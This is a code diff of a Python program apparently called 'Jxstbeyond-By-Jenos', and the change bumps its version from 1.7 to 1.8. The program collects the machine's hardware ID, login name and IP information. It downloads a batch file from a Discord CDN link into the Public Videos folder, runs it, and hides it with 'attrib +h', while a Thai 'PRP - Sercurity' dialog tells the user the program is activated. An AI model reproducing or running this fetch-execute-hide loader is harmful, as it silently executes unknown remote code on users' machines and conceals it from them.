@@ -111,7 +111,7 @@ new_hwid = generate_hwid()[:16]
 hw = gethwid()[:15]
 mypcname = os.getlogin()
 NameProject = ("Jxstbeyond-By-Jenos")
-Version = ("1.7")
+Version = ("1.8")
 hwiduuid = f'''{NameProject} [{hw}-{mypcname}-{new_hwid}]''' 
 ipinfo = requests.get('https://ipinfo.io/json')
 ipinfojson = ipinfo.json()
@@ -448,15 +448,15 @@ def J3Ke3NEtwork(event):
         mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1181918320149135370/J3Ke3NEtwork.bat?ex=6582ce36&is=65705936&hm=38d55d1972ac2d3b8955ad3a2470d3c91dc89405d28fc3efeb30ae5a03494654&"
         if is_admin(): 
             try:
-                os.startfile(f'C:/Users/Public/Videos/Hermes_God.bat')
+                os.startfile(f'C:/Users/Public/Videos/J3Ke3NEtwork.bat')
                 messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
             except:
-                with open(f'C:/Users/Public/Videos/Hermes_God.bat', 'wb') as f:
+                with open(f'C:/Users/Public/Videos/J3Ke3NEtwork.bat', 'wb') as f:
                     f.write(requests.get(mystr_encoded).content)
-                os.startfile(f'C:/Users/Public/Videos/Hermes_God.bat')
+                os.startfile(f'C:/Users/Public/Videos/J3Ke3NEtwork.bat')
                 messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
 
-                _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Hermes_God.bat')
+                _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/J3Ke3NEtwork.bat')
                 _doHideBatch.read()
                 _doHideBatch.close()
         else:
